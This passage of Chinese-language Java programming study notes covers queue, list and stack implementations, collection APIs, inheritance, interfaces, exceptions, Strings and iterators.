last = new List(x); // 创建新节点，first 和 last 都指向它 [cite: 2667-2669] &#125; else &#123; last.next = new List(x); // 在队尾后面插入新节点 [cite: 2670] last = last.next; // 更新 last 指针到新节点 [cite: 2671] &#125;&#125;// 转换为字符串public String toString() &#123; return List.toString(first); // [cite: 2664]&#125; 2. 实现思路二：使用动态数组（环形队列） 使用数组和索引指针 first（队首索引）和 last（队尾索引），并通过模运算实现环形队列，并支持动态扩容。 12345678910111213141516public class Queue &#123; private int first, last; // 队首、队尾索引 private int[] a; // 底层数组 // 构造函数 public Queue () &#123; first = last = -1; // 初始化为空，索引为 -1 [cite: 2782] a = new int[4]; // 创建初始大小为 4 的数组 [cite: 2782] &#125; // 检测是否为空队列 public boolean isEmpty() &#123; return first == -1; // [cite: 2783] &#125; // ...&#125; 操作： 123456789101112131415161718192021222324252627282930313233343536// 入队元素（Enqueue）public void enqueue (int x) &#123; if (first == -1) // 检查是否为空，如果为空则初始化 first 和 last first = last = 0; // [cite: 2791] else &#123; int n = a.length; // [cite: 2792] last = (last + 1) % n; // 队尾指针环形前进 [cite: 2792] if (last == first) &#123; // 判断队列是否已满 (新 last 等于 first) [cite: 2792] int[] b = new int[2 * n]; // 创建两倍大小的新数组 [cite: 2792] // 复制元素：按顺序从 a[first] 开始复制到 b[0] for (int i = 0; i &lt; n; i++) b[i] = a[(first + i) % n]; // [cite: 2793] first = 0; // 重置 first 到新数组的头部 [cite: 2793] last = n; // 重置 last 到新数组的末尾 [cite: 2793] a = b; // [cite: 2793] &#125; &#125;// end else a[last] = x; // 将新元素存入队尾位置 [cite: 2794]&#125;// 出队元素（Dequeue）public int dequeue () &#123; // 假设 first != -1 int result = a[first]; // 取出队首元素 [cite: 2797] if (first == last) // 如果取出后队列为空 first = last = -1; // 重置为 -1 [cite: 2797] else first = (first + 1) % a.length; // 队首指针环形前进 [cite: 2797] return result; // [cite: 2797]&#125; 另一种完整的List/Stack/Queue的实现List部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package pgdp.collections;public class List &#123; private int size; private Element head; private Element tail; public List()&#123; size = 0; head = null; tail = null; &#125; public boolean isEmpty() &#123; return size == 0; &#125; public void clear() &#123; size = 0; head = null; tail = null; &#125; public void add(String value) &#123; if (isEmpty())&#123; head = tail = new Element(value); size = 1; return; &#125; Element newTail = new Element(value); tail.next = newTail; tail = newTail; size++; &#125; public boolean add(int index, String value) &#123; if (index &lt;0 || index &gt; size)&#123; return false; &#125; if(isEmpty())&#123; head = tail = new Element(value); size ++; return true; &#125; if (index == 0)&#123; head = new Element(value,head); size ++; return true; &#125; if (index == size)&#123; Element newTail = new Element(value); tail.next = newTail; tail = newTail; size++; return true; &#125; Element prev = head; for (int i = 0; i &lt; index - 1; i++) &#123; prev = prev.next; &#125; prev.next = new Element(value, prev.next); size++; return true; &#125; public String get(int index) &#123; if (index &lt;0 || index &gt;= size)&#123; return null; &#125; if(isEmpty())&#123; return null; &#125; Element cur = head; for (int i = 0; i &lt; index; i++) &#123; cur = cur.next; &#125; return cur.value; &#125; public void remove(int index) &#123; if (index &lt;0 || index &gt;= size)&#123; return; &#125; if(isEmpty())&#123; return; &#125; if (index == 0)&#123; head = head.next; size--; if (size == 0)&#123; tail = null; &#125; return; &#125; Element prev = head; for (int i = 1; i &lt; index; i++) &#123; prev = prev.next; &#125; prev.next = prev.next.next; if (index == size-1)&#123; tail = prev; &#125; size--; return; &#125; public int getSize() &#123; return size; &#125; private static class Element &#123; private String value; private Element next; public Element (String value)&#123; this.value = value; next = null; &#125; public Element(String value, Element next)&#123; this.value = value; this.next = next; &#125; &#125;&#125; Stack： 1234567891011121314151617181920212223package pgdp.collections;import java.lang.annotation.ElementType;public class Stack &#123; private List list; public Stack()&#123; list = new List(); &#125; public String pop() &#123; String result = list.get(list.getSize() -1); list.remove(list.getSize() -1); return result; &#125; public void push(String value) &#123; list.add(value); &#125;&#125; Queue： 1234567891011121314151617181920package pgdp.collections;public class Queue &#123; private List list; public Queue() &#123; list = new List(); &#125; public String pop() &#123; String result = list.get(0); list.remove(0); return result; &#125; public void push(String value) &#123; list.add(value); &#125;&#125; LinkedList（链表）创建与复制 123456import java.util.*;// 具体点是import java.util.LinkedList；LinkedList&lt;Integer&gt; a = new LinkedList&lt;&gt;(); // 空链表LinkedList&lt;Integer&gt; b = new LinkedList&lt;&gt;(a); // 拷贝一份（浅拷贝）LinkedList&lt;Integer&gt; c = new LinkedList&lt;&gt;(List.of(1,2,3)); // 从已有集合初始化 判空与长度 12a.isEmpty(); // 是否为空a.size(); // 元素个数 增加元素（头/尾/指定位置） 1234a.add(10); // 尾部追加（返回boolean）a.addLast(10); // 尾部追加（void）a.addFirst(5); // 头部插入a.add(1, 99); // 在索引1处插入 访问元素（不删除） 1234567a.get(0); // 按索引访问（O(n)）,空则返回 NoSuchElementExceptiona.getFirst(); // 取头元素（O(1)）a.getLast(); // 取尾元素（O(1)）a.peek(); // 取头元素，空则返回 nulla.peekFirst(); // 同上a.peekLast(); // 取尾元素，空则返回 null 删除元素（并返回） 1234567a.removeFirst(); // 删除并返回头元素（空会抛异常）a.removeLast(); // 删除并返回尾元素a.remove(); // 等价 removeFirst()a.poll(); // 删除并返回头元素（空则返回 null）a.pollFirst(); // 同上a.pollLast(); // 删除尾元素（空则返回 null） 删除指定元素/位置 123a.remove(0); // 删除索引0处元素，返回被删元素a.remove((Integer)10); // 删除“值为10”的那个元素（只删第一个匹配），返回booleana.clear(); // 清空 查找/判断包含 123a.contains(10); // 是否包含a.indexOf(10); // 第一次出现的位置，没有则 -1a.lastIndexOf(10); // 最后一次出现的位置 遍历 12for (int x : a) &#123; ... &#125; // 增强 fora.forEach(x -&gt; &#123; ... &#125;); // forEach + lambda 批量操作 123a.addAll(b); // 把 b 全部追加到 aa.removeAll(b); // 从 a 里删掉所有出现在 b 的元素a.retainAll(b); // 只保留 a 和 b 的交集 转换与打印 12System.out.println(a); // 直接打印：[1, 2, 3]a.toArray(); // 转数组（Object[]） ArrayList（动态数组）创建与初始化 1234567import java.util.*;// 具体一点是 import java.util.ArrayList;ArrayList&lt;Integer&gt; a = new ArrayList&lt;&gt;(); // 空ArrayList&lt;Integer&gt; b = new ArrayList&lt;&gt;(20); // 预分配容量（可选）ArrayList&lt;Integer&gt; c = new ArrayList&lt;&gt;(List.of(1,2,3)); // 从已有集合拷贝List&lt;Integer&gt; d = new ArrayList&lt;&gt;(); // 推荐：用接口类型声明 添加元素 1234a.add(10); // 末尾追加a.add(0, 99); // 指定位置插入（后面元素整体后移）a.addAll(List.of(1,2,3)); // 批量追加a.addAll(1, List.of(7,8)); // 从索引1处批量插入 读取与改 12int x = a.get(0); // 按索引读（ArrayList 很快）a.set(0, 100); // 按索引改，返回旧值 删除 按索引删除 1a.remove(0); // 删除索引0，返回被删元素 按值删除（注意 Integer 的坑） 1a.remove(Integer.valueOf(10)); // 删除“值为10”的第一个匹配，返回 boolean 批量删除/保留 123a.clear(); // 清空a.removeAll(List.of(1,2)); // 删除所有出现在参数集合里的元素a.retainAll(List.of(3,4)); // 只保留和参数集合的交集 查找与判断 12345a.size();a.isEmpty();a.contains(10);a.indexOf(10); // 第一次出现位置，没找到 -1a.lastIndexOf(10); // 最后一次出现位置 遍历 123for (int v : a) &#123; ... &#125;for (int i = 0; i &lt; a.size(); i++) &#123; ... &#125;a.forEach(v -&gt; &#123; ... &#125;); // lambda 排序与反转 123Collections.sort(a); // 升序Collections.reverse(a); // 反转Collections.shuffle(a); // 打乱 截取子列表 1List&lt;Integer&gt; sub = a.subList(1, 4); // [1,4) 左闭右开 subList 返回的是原列表的视图，改 sub 会影响 a，反之也一样。想要独立拷贝： 1List&lt;Integer&gt; subCopy = new ArrayList&lt;&gt;(a.subList(1, 4)); 转换 1234Object[] arr = a.toArray();Integer[] arr2 = a.toArray(new Integer[0]);List&lt;Integer&gt; copy = new ArrayList&lt;&gt;(a); // 拷贝 面向对象继承（Vererbung）现实世界里有很多相似但不完全相同的对象，比如说人类，猩猩，狼等哺乳类动物。 Idea： 把共同点提到上面（父类 / 超类） 把不同点留在下面（子类 / 派生类） 这样可以 增量开发 和 复用代码（software reuse） 来看个很简单的例子：书和字典。 因为所有书都有页数这个属性，所有我们可以把这个属性直接放进书（父类）的字段里，这样一来各种书都会自动继承这个字段，不需要我们在每种不同的书里都再定义一遍它。 书（父类）： 123456789public class Book &#123; protected int pages; public Book() &#123; pages = 150; &#125; public void page_message() &#123; System.out.print(&quot;Number of pages:\\t&quot; + pages + &quot;\\n&quot;); &#125;&#125; 字典（子类）： 1234567891011public class Dictionary extends Book &#123; private int defs; public Dictionary(int x) &#123; pages = 2 * pages; // 继承来的属性 defs = x; // 自己的属性 &#125; public void defs_message() &#123; System.out.print(&quot;Number of defs:\\t\\t&quot; + defs + &quot;\\n&quot;); System.out.print(&quot;Defs per page:\\t\\t&quot; + defs / pages + &quot;\\n&quot;); &#125;&#125; extends 表示继承：子类Dictionary拥有 Book的所有字段（attribute），再加上自己的字段。 访问控制（private / protected / public） 修饰符 同类内部 同 package 子类 外部世界 private ✅ ❌ ❌ ❌ default（不写） ✅ ✅ (同 package 的子类才行) ❌ protected ✅ ✅ ✅ ❌ public ✅ ✅ ✅ ✅ 123public class Book &#123; int pages; // 这种时候就是default&#125; 例子： 1234567891011121314151617public class Food &#123; private int CALORIES_PER_GRAM = 9; private int fat, servings; public Food(int num_fat_grams, int num_servings) &#123; fat = num_fat_grams; servings = num_servings; &#125; private int calories() &#123; return fat * CALORIES_PER_GRAM; &#125; public int calories_per_serving() &#123; return (calories() / servings); &#125;&#125; 12345public class Pizza extends Food &#123; public Pizza (int amount_fat) &#123; super(amount_fat, 8); &#125;&#125; 1234567public class Eating &#123; public static void main (String[] args) &#123; Pizza special = new Pizza(275); System.out.print(&quot;Calories per serving: &quot; + special.calories_per_serving()); &#125;&#125; Pizza继承了Food的所有成员，但calories()和属性都是private，所以在Pizza里不能直接访问。但可以通过public的方法calories_per_serving() 间接使用。 关键字 super很多时候我们需要在子类的构造器里调用父类的构造器，这个时候就需要用到super()。 比如说刚才披萨例子里的： 123public Pizza (int amount_fat) &#123; super(amount_fat, 8);&#125; 调用super()相当于就是在调用父类的构造器，所以接收的参数也一模一样。 而super和this类似，只不过指代的是父类。可以用super.来调用父类的所有函数。 比如说刚才字典的例子可以改写成这样： 123456789public class Book &#123; protected int pages; public Book(int x) &#123; pages = x; &#125; public void message() &#123; System.out.print(&quot;Number of pages:\\t&quot; + pages + &quot;\\n&quot;); &#125;&#125; 123456789101112public class Dictionary extends Book &#123; private int defs; public Dictionary(int p, int d) &#123; super(p); // 调用父类构造器 defs = d; &#125; public void message() &#123; super.message(); // 先调用 Book.message() System.out.print(&quot;Number of defs:\\t\\t&quot; + defs + &quot;\\n&quot;); System.out.print(&quot;Defs per page:\\t\\t&quot; + defs / pages + &quot;\\n&quot;); &#125;&#125; 属性和方法的覆盖/重写与隐藏方法重写（override） 当子类里定义了一个同名、同参数列表、同返回类型的方法，就会覆盖（verschatten）父类的实现。 方法调用解析的规则： 编译时，先在静态类型的类中根据方法名和参数类型，找到最合适的签名（考虑重载）。 运行时，从动态类型开始往上找这个签名的方法，实现采用最下面的那个实现。 所以方法的选择是参数，静态类型和动态类型共同决定的。 Object 类任意类如果没写 extends，默认都是 extends Object Object 提供了很多通用方法，其中常用的： String toString()：把对象转成字符串 boolean equals(Object obj)：默认比较引用是否相同（this == obj） int hashCode()：给对象一个哈希值，和集合类有关 例子： 12345678910111213public class Poly &#123; public String toString() &#123; return &quot;Hello&quot;; &#125;&#125;public class PolyTest &#123; public static String addWorld(Object x) &#123; return x.toString() + &quot; World!&quot;; &#125; public static void main(String[] args) &#123; Object x = new Poly(); System.out.print(addWorld(x) + &quot;\\n&quot;); // Hello World! &#125;&#125; 抽象类（abstract）、final 类和接口（interface）抽象方法与抽象类抽象方法：没有实现，只写方法头，用abstract标记。需要在子类里具体实现。 抽象类：只要含有抽象方法，这个类本身也必须标记abstract，不能直接new。不过一个抽象类里也可以有具体的方法。（比如下面例子里的getValue()） 例子： 1234567891011121314public abstract class Expression &#123; private int value; private boolean evaluated = false; public int getValue() &#123; if (evaluated) return value; else &#123; value = evaluate(); evaluated = true; return value; &#125; &#125; protected abstract int evaluate();&#125; 不同的子类（每个里都需要具体实现evaluate()）： 1234567891011121314151617181920212223242526272829public final class Const extends Expression &#123; private int n; public Const(int x) &#123; n = x; &#125; protected int evaluate() &#123; return n; &#125;&#125;public final class Add extends Expression &#123; private Expression left, right; public Add(Expression l, Expression r) &#123; left = l; right = r; &#125; protected int evaluate() &#123; return left.getValue() + right.getValue(); &#125;&#125;public final class Neg extends Expression &#123; private Expression arg; public Neg(Expression a) &#123; arg = a; &#125; protected int evaluate() &#123; return -arg.getValue(); &#125;&#125; 1234Expression e = new Add( new Neg(new Const(8)), new Const(16));System.out.println(e.getValue()); final类和final方法与abstract通常需要子类来实现其抽象方法后才能真正使用不同，final是不能有子类。 final class：不能有子类。（例如上面的 Const, Add, Neg） final方法：不能被子类重写。 final变量：只能赋值一次（常量）。 接口（Interfaces）之前说到了一个类可以有很多的子类，但是如果我们希望一个子类C同时继承A类和B类的话，那么当A,B里都有一个相同名字的函数meth()时，C类调用super.meth()时到底会调用A类的还是B类的呢？ Java的解决方案非常简单：只允许单继承类，但允许实现多个接口。 接口可以看作是一个特殊的抽象类，只不过其中： 所有方法都是抽象的 所有字段都是常量 接口这个东西有点抽象，所以我们先来看个简单的例子：123public interface Shape &#123; double area();&#125; 123456789101112131415161718192021// 圆形public class Circle implements Shape &#123; private double r; public Circle(double r) &#123; this.r = r; &#125; public double area() &#123; return Math.PI * r * r; &#125;&#125;// 矩形public class Rectangle implements Shape &#123; private double w, h; public Rectangle(double w, double h) &#123; this.w = w; this.h = h; &#125; public double area() &#123; return w * h; &#125;&#125; 1234567891011121314public class Main &#123; public static double computeArea(Shape s) &#123; return s.area(); // 调用的具体实现由运行时决定（Circle 或 Rectangle） &#125; public static void main(String[] args) &#123; Shape c = new Circle(2.0); Shape r = new Rectangle(3.0, 4.0); System.out.println(computeArea(c)); // 圆的面积 System.out.println(computeArea(r)); // 矩形的面积 &#125;&#125; 1234567public static double totalArea(Shape[] shapes) &#123; double sum = 0; for (Shape s : shapes) &#123; sum += s.area(); // 不需要单独根据本身的类型处理列表里的每一项 &#125; return sum;&#125; 这里的接口主要有几个好处： 提供统一的类型（Shape），从而可以写通用代码：函数参数/返回值/集合元素都用接口类型，不依赖具体类。 处理混合类型集合更简单：Shape[] / List&lt;Shape&gt;里放各种形状，直接循环调用 area()，无需 instanceof。 编译期强制规范：implements Shape的类必须实现 area()，编译器自动检查，减少约定没遵守的错误。 当然接口之间也可以extends： 例如接口 Countable： 123public interface Comparable &#123; int compareTo(Object x);&#125; 12345public interface Countable extends Comparable, Cloneable &#123; Countable next(); Countable prev(); int number();&#125; Countable组合了两个接口：Comparable和Cloneable，任何实现Countable的类都必须实现这三个接口中的所有方法（compareTo, next, prev, number 等）。 多态（Polymorphie）Polymorphie这个单词来自希腊语词根： poly- = 多、许多 -morph = 形态、形式 -ie（名词后缀） 所以字面意思就是：多种形态/多种形式性。 而在面都对象编程里的定义一般是这样：多态：同一个“接口/父类型”的变量或方法调用，在运行时可以指向不同的具体对象，从而表现出不同的具体行为。 简单来讲就是：同一句代码（同一个方法调用），因为对象的真实类型不同，执行出不同的结果。 分为编译期和运行期。编译期会检查函数签名，运行期会调用具体的最底层的函数实现。 在继承体系中的多态与方法选择规则泛型类（Generische Klassen）可以用java自带的LinkedList&lt;&gt;以及泛型来实现Stack： 123456789101112131415package pgdp.collections;import java.util.LinkedList;public class Stack&lt;T&gt; &#123; private final LinkedList&lt;T&gt; stackList = new LinkedList&lt;&gt;(); public void push(T value) &#123; stackList.addLast(value); &#125; public T pop() &#123; return stackList.pollLast(); &#125;&#125; 这里&lt;&gt;里的T只是一个占位符，一般用T是因为取的Type的首字母。可以用任意字母。 包装类（Wrapper-Klassen）递归Fibonacci普通递归： 123456public static long fibonacciRec(int n) &#123; if (n == 0) return 0L; if (n == 1) return 1L; return fibonacciRec(n - 1) + fibonacciRec(n - 2);&#125; 尾递归： 123456789101112public class Fibonacci &#123; public static long fibonacciEndRec(int n) &#123; return fibTail(n, 0L, 1L); &#125; private static long fibTail(int n, long a, long b) &#123; if (n == 0) return a; return fibTail(n - 1, b, a + b); &#125;&#125; 异常处理当程序运行出现错误时，会中断正常执行流程 ，然后创建并抛出（throw）一个错误/异常对象。 我们可以捕获并处理这些异常。 所有的错误都继承自 Throwable 类。主要分为两类 ： Error：致命错误，通常导致程序终止。 例子：StackOverflowError（栈溢出，通常由无限递归引起）、OutOfMemoryError（内存耗尽）。 处理建议：应用程序通常不应该试图捕获这些错误，因为一旦发生，程序基本就无法继续运行了。 Exception：可处理的异常。 a. 运行时异常 (Runtime Exceptions / Unchecked Exceptions)： 继承自 RuntimeException。 特点：通常由编程逻辑错误引起。编译器不强制要求你捕获它们。 例子： NullPointerException：试图访问空对象的属性或方法。 IndexOutOfBoundsException：访问数组或列表越界。 ArithmeticException：如除以零（例如 1/0）。 b. 受检异常 (Checked Exceptions)： 继承自 Exception 但不是 RuntimeException 的子类。 特点：通常由外部环境引起（如文件不存在、网络断开）。编译器强制要求你必须处理（捕获或声明抛出），否则代码无法编译通过。 例子：IOException（输入输出错误）、FileNotFoundException（文件未找到）。 事先定义好的错误类型： IOException：“输入/输出异常”（Input/Output Exception） FileNotFoundException 读文件时路径不存在 没权限访问 给了一个目录当文件去打开 EOFException EOF = End Of File（文件结束）。 通常出现在用 DataInputStream / ObjectInputStream 之类按“二进制格式”读数据时，读到文件末尾还想继续读。 InterruptedIOException I/O 操作被中断，或超时导致读写中断。常见于网络流、某些阻塞读写。 UnsupportedEncodingException：某种字符编码不支持。 RuntimeException 如果不处理会怎样？如果错误发生且未被捕获，程序执行会中止 。 比如说在这个例子里： 1234567public class Zero &#123; public static main(String[] args) &#123; int x = 10; int y = 0; System.out.println(x/y) &#125;&#125; 程序崩溃并打印堆栈跟踪（Stack Trace）: 12Exception in thread &quot;main&quot; java.lang.ArithmeticException: / by zeroat Zero.main(Compiled Code) 包含三部分信息 ： 发生错误的线程（如 main）。 错误类的名称及消息（如 java.lang.ArithmeticException: / by zero）。 发生错误的位置（调用栈信息） 。 处理错误错误处理的标准结构： try 块： 包含可能出错的代码语句 。 catch 块： 紧跟在 try 之后，包含错误处理逻辑。形式为 catch (Exc e) &#123;...&#125;，其中 Exc 是错误类型，e 是错误对象 。 多重捕获：可以有多个 catch 块。 注意顺序：必须先捕获具体的子类异常，再捕获通用的父类异常（如先 catch (FileNotFoundException e)，后 catch (IOException e)）。如果顺序反了，子类的catch块永远无法到达。 finally 块： 无论是否发生异常，finally 中的代码一定会被执行。 如果try块无错误：try执行完后执行finally 。 如果捕获了错误：catch块执行完后执行finally 。 如果错误未被捕获：先执行finally，然后继续抛出错误 。 用途：主要用于资源清理，如关闭打开的文件流（stream.close()）、释放数据库连接等。哪怕try块中有return语句，finally也会在返回之前执行。 自定义异常自定义异常的过程主要分为三步：继承、构造、抛出。 1. 选择继承的父类 (核心决策)这是定义异常时最重要的第一步。你需要决定你的异常是“受检的”还是“非受检的”。 情况 A：继承 java.lang.Exception (受检异常 Checked Exception) 含义：这是一个必须被处理的错误。 场景：通常用于业务逻辑错误或外部环境问题（如“余额不足”、“用户不存在”）。你希望强制调用者显式地处理这个情况（try-catch）。 后果：如果不捕获，代码无法编译通过。 情况 B：继承 java.lang.RuntimeException (非受检异常 Unchecked Exception) 含义：这是一个编程错误或不可恢复的错误。 场景：通常用于参数错误或代码逻辑漏洞。 后果：编译器不强制要求捕获。 2. 提供构造函数为了让异常携带错误信息，你需要在你的类中重写构造函数，并调用父类（super）的方法。 Java 123456789101112131415161718// 示例：定义一个“库存不足”异常（受检异常）public class OutOfStockException extends Exception &#123; // 1. 无参构造 public OutOfStockException() &#123; super(); &#125; // 2. 带有错误消息的构造 (最常用) public OutOfStockException(String message) &#123; super(message); // 将消息传递给父类，以便通过 e.getMessage() 获取 &#125; // 3. 带有原因的构造 (用于异常链，见下文注意事项) public OutOfStockException(String message, Throwable cause) &#123; super(message, cause); &#125;&#125; 3. 抛出与声明 (Throw &amp; Throws)定义好之后，你就可以在业务代码中使用它了。 抛出 (Throw)：在检测到错误逻辑的地方，创建一个异常对象并抛出。 Java 123if (quantity &gt; stock) &#123; throw new OutOfStockException(&quot;当前库存不足，剩余: &quot; + stock);&#125; 声明 (Throws)：如果你定义的异常继承自 Exception（受检异常），你必须在方法签名上告诉调用者可能会抛出这个异常。 Java 123public void buyProduct(int quantity) throws OutOfStockException &#123; // ...&#125; 为什么需要异常核心的原因是为了把“正常逻辑”与“错误处理”分开。 比如说下面这个例子 用 if 的代码风格： 1234567if (打开文件成功) &#123; if (读取第一行成功) &#123; if (解析数字成功) &#123; // 做业务... &#125; else &#123; 处理解析错误 &#125; &#125; else &#123; 处理读取错误 &#125;&#125; else &#123; 处理文件错误 &#125; 写起来也很麻烦，阅读起来非常累，很难一眼看清核心业务到底在干嘛。 用 try-catch 的代码风格： 12345678try &#123; 打开文件(); 读取第一行(); 解析数字(); // 纯粹的业务逻辑，很连贯&#125; catch (Exception e) &#123; // 统一在一个地方处理所有异常的事情&#125; 这种写法让人一眼就能看懂“正常情况下程序在做什么”。 除此以外，很多错误是检查不出来的 (不可预测性)。有些错误是外部环境导致的，if 检查在时间上存在漏洞（这叫做 TOCTOU 问题：Time Of Check to Time Of Use）。 字符串 (Strings)在JAVA中，String 是一个非常特殊且极其重要的类。 不可变性 (Immutability)一个String对象一旦在内存中被创建，它的内容就永远无法改变。 例子： 12String s = &quot;Hello&quot;;s = s + &quot; World&quot;; // s 变成了 &quot;Hello World&quot; 看起来 s 变了，但实际上： 内存中创建了”Hello”。 内存中创建了” World”。 内存中创建了一个全新的对象”Hello World”。 变量 s 的指针从指向”Hello”改为指向”Hello World”。 原来的”Hello”如果没人用，就会变成垃圾被回收。 为什么这么设计？ 安全性：String 常用于数据库连接、文件名、网络地址。如果它是可变的，黑客可以在你检查完权限后、真正使用前修改它的内容。 缓存：因为不可变，所以它的哈希值（HashCode）只需要算一次就可以缓存起来，放入 HashMap 效率极高。 线程安全：多个线程同时读一个字符串，完全不用担心有人会改动它。 字符串常量池 (String Pool)为了避免内存浪费（比如代码里写了 100 次 “Hello”，没必要在内存里存 100 份），Java 设计了一个特殊的内存区域叫 String Pool。 两种创建方式： 字面量赋值 (Literal) 12String s1 = &quot;Hallo&quot;;String s2 = &quot;Hallo&quot;; Java 会先去池子里找有没有 “Hallo”。 如果没有：创建一个放入池子，返回引用。 如果有：直接返回池子里那个对象的引用。 结果：s1 == s2 为 true (它们指向同一个内存地址)。 使用 new 关键字 1String s3 = new String(&quot;Hallo&quot;); new 关键字强制在堆内存 (Heap) 中创建一个新对象，不管池子里有没有。 结果：s1 == s3 为 false (地址不同)。 intern() 方法它是连接“普通堆内存”和“字符串池”的桥梁。 作用：手动将字符串加入池中。 逻辑： 调用 s3.intern() 时： 检查池中是否已经包含等于 s3 的字符串。 如果有：返回池中那个对象的引用。 如果没有：将 s3 的引用加入池中，并返回它。 代码演示： 123456String s3 = new String(&quot;Hallo&quot;); // s3 在堆上，不在池里String s4 = s3.intern(); // s4 指向池里的 &quot;Hallo&quot;String s1 = &quot;Hallo&quot;; // s1 也是池里的 &quot;Hallo&quot;System.out.println(s3 == s1); // falseSystem.out.println(s4 == s1); // true 字符串比较 ==：比较的是内存地址（是不是同一个对象）。 利用String Pool和 intern()，我们可以强制让相同内容的字符串共享同一个对象，从而可以使用 == 来加速比较（比逐个字符对比快得多）。 equals()：比较的是内容（长得一不一样）。 这个String Pool本质上是通过哈希表来实现高效运作的： 计算字符串内容的哈希值 分配到指定的桶里 查找的时候先计算哈希值，然后去桶里找 常用的String方法trim()用法： 1String s2 = s1.trim(); 作用： 去掉字符串开头和结尾的所有空白字符（包括空格、制表符 \\t、换行 \\n 等）。 中间的空格不会被去掉。 返回新字符串，不会直接修改原本的。 例子： 12String s = &quot; hello world \\n&quot;;String t = s.trim(); // t == &quot;hello world&quot; isEmpty()用法： 1boolean b = s.isEmpty(); 作用： 判断字符串长度是否为 0，相当于 s.length() == 0。 例子： 123&quot;&quot;.isEmpty(); // true&quot; &quot;.isEmpty(); // false，因为里面有一个空格&quot;abc&quot;.isEmpty(); // false toLowerCase()用法： 1String lower = s.toLowerCase(); 作用： 返回一个全部小写的新字符串，不改变原来的字符串。 例子： 1&quot;PiNguin&quot;.toLowerCase(); // &quot;pinguin&quot; replace(target, replacement)用法： 1String s2 = s1.replace(&quot;.&quot;, &quot;&quot;); 作用： 把所有出现的子串 target 替换成 replacement。 不用正则，就是普通的字符串匹配。 返回新字符串，不改原来的。 例子： 12345678String s = &quot;Pinguin, Pinguin! (?Ping(uin!)&quot;;s = s.toLowerCase();s = s.replace(&quot;.&quot;, &quot;&quot;);s = s.replace(&quot;,&quot;, &quot;&quot;);s = s.replace(&quot;!&quot;, &quot;&quot;);s = s.replace(&quot;(&quot;, &quot;&quot;);s = s.replace(&quot;)&quot;, &quot;&quot;);// &quot;pinguin pinguin ?pinguin&quot; split(String regex)用法： 1String[] parts = s.split(&quot;\\\\s+&quot;); 作用： 用参数 regex 作为正则表达式，将字符串按匹配的位置拆分成若干段，返回 String[]。 注意：参数是正则表达式而不是普通字符串。 \\\\s+实际上就是\\s+，表示匹配一个或多个空白字符（空格、tab、换行等）。 split(&quot; &quot;)则会按单个空格拆分。 例子： 123456String s = &quot; hello world \\n pinguin &quot;;String[] parts = s.trim().split(&quot;\\\\s+&quot;);// parts[0] == &quot;hello&quot;// parts[1] == &quot;world&quot;// parts[2] == &quot;pinguin&quot; length()用法： 1int len = s.length(); 作用： 返回字符串中字符的个数（不是字节数）。 例子： 123&quot;&quot;.length(); // 0&quot;abc&quot;.length(); // 3&quot;中文&quot;.length(); // 2 compareTo()用法： 1int result = s1.compareTo(s2); 作用： 按字典序（lexicographical order）比较两个字符串的大小。 返回一个 int（只保证小于等于大于0这三种情况，不保证具体的数值。）： &lt; 0：s1 在字典序上 小于 s2 = 0：s1 和 s2 内容相同 &gt; 0：s1 在字典序上 大于 s2 例子： 123456789101112&quot;abc&quot;.compareTo(&quot;abd&quot;); // 结果 &lt; 0，因为 &#x27;c&#x27; &lt; &#x27;d&#x27;&quot;abc&quot;.compareTo(&quot;abc&quot;); // 结果 = 0，两个字符串完全一样&quot;abd&quot;.compareTo(&quot;abc&quot;); // 结果 &gt; 0，因为 &#x27;d&#x27; &gt; &#x27;c&#x27;&quot;app&quot;.compareTo(&quot;apple&quot;); // 结果 &lt; 0，&quot;app&quot; 是前缀，长度更短&quot;apple&quot;.compareTo(&quot;app&quot;); // 结果 &gt; 0，&quot;apple&quot; 比 &quot;app&quot; 长&quot;abc&quot;.compareTo(&quot;Abc&quot;); // 一般 &gt; 0，小写 &#x27;a&#x27; 的编码值大于大写 &#x27;A&#x27;if (w1.compareTo(w2) &gt; 0) &#123; // ...&#125; 迭代器 (Iterators)如果在编程中没有迭代器，我们处理不同的数据结构会非常麻烦：数组用索引 i 遍历，链表用 node.next 遍历，哈希表（Set/Map）甚至没有顺序，很难遍历。 迭代器模式 (Iterator Pattern) 的核心目的就是：提供一种统一、标准的方式来遍历任何类型的集合，而不需要了解集合底层的具体实现（是数组还是链表）。 在 Java 中，迭代器机制涉及两个长得很像但职责完全不同的接口： Iterable&lt;T&gt; (可迭代的) 角色：这是集合（容器）要实现的接口。 含义：它向外界声明：“我是存储数据的容器，你可以遍历我。” 核心方法： iterator(): 这个方法被调用时，必须返回一个新的、准备好从头开始遍历的 Iterator 对象。 地位：所有的标准集合（List, Set 等）都实现了这个接口。 Iterator&lt;T&gt; (迭代器) 角色：这是负责执行遍历操作的“指针”对象。 含义：它不存储数据，它只是记录“当前读到哪里了”。 核心方法： boolean hasNext(): 探测。检查是否还有下一个元素。如果还没遍历完，返回 true。 E next(): 取值并前移。返回当前的元素，并将内部指针向下移动一步。 注意：如果已经没有元素了还强行调用 next()，会抛出 NoSuchElementException。 void remove() (可选): 删除。删除最近一次由 next() 返回的那个元素。 注意：不能连续调用两次 remove()，必须先调用 next() 才能调用 remove()。 例子： 123456789class IterableString implements Iterable&lt;Character&gt; &#123; private String str; public IterableString(String str) &#123; this.str = str; &#125; public Iterator&lt;Character&gt; iterator() &#123; return new IterableStringIterator(str); &#125;&#125; 123456789101112131415class IterableStringIterator implements Iterator&lt;Character&gt; &#123; private String str; private int count = 0; public IterableStringIterator(String str) &#123; this.str = str; &#125; public boolean hasNext() &#123; return count &lt; str.length(); &#125; public Character next() &#123; if (count == str.length()) &#123; throw new NoSuchElementException(); &#125; return str.charAt(count++); &#125; public void remove() &#123; throw new UnsupportedOperationException(); &#125;&#125; Kollektionen (集合框架)Collection 是对象的容器（Sammlung von Objekten）。 目标： 统一架构：提供一套标准的方式来存储和操作数据，不需要程序员自己去写链表或动态数组。 抽象化：你只需要针对接口（如 List）编程，而不需要关心底层是用数组实现的（ArrayList）还是链表实现的（LinkedList）。 互操作性：不同的库可以轻松交换数据。 性能：Java 官方提供了高性能的实现。 Collection&lt;E&gt; 接口这是最通用的接口。如果你只知道一个东西是 Collection： 你知道的：它能添加(add)、删除(remove)、查大小(size)、清空(clear)、检查包含(contains)、转数组(toArray)，并且它是 Iterable 的（可以用 for-each 循环）。 你不知道的：它是否有序？是否允许重复？是否允许 null？（这些取决于具体的子接口或实现类）。 List&lt;E&gt; 接口 特点： 